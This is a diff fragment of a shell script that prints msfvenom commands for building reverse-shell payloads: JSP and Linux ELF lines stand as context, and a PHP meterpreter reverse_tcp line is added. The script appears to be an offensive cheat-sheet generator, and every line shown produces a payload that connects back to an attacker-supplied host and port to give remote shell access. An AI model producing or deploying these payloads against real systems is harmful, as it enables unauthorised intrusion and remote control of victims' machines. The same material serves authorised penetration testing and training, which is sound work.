@@ -41,6 +41,9 @@ printf "\n\n"
 printf "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > rev_shell.jsp"
 printf "\n\n"
 
+printf "msfvenom -p php/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f raw > shell.php"
+printf "\n\n"
+
 printf "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$1 LPORT=$2 -f elf > rev_shell.sh"
 printf "\n\n"
 
